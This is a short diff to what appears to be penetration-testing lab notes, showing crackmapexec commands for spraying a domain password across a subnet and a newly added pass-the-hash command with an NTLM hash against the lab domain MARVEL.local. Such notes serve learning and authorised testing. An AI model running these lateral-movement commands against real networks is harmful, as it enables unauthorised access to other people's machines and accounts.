@@ -1,10 +1,14 @@
-### crackmapexec
+## crackmapexec
 
 Use crackmapexec to pass the password around the network and see what other machines include this account
 
 ```bash
 example: crackmapexec smb 192.168.16.0/24 -u fcastle -d MARVEL.local -p Password1
 Usage: crackmapexec smb [ ip/CIDR] -u [username] -d [domain] -p [password]
+```
+### Pass the Hash
+```bash
+crackmapexec smb 192.168.16.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
 ```
 
 ### psexec
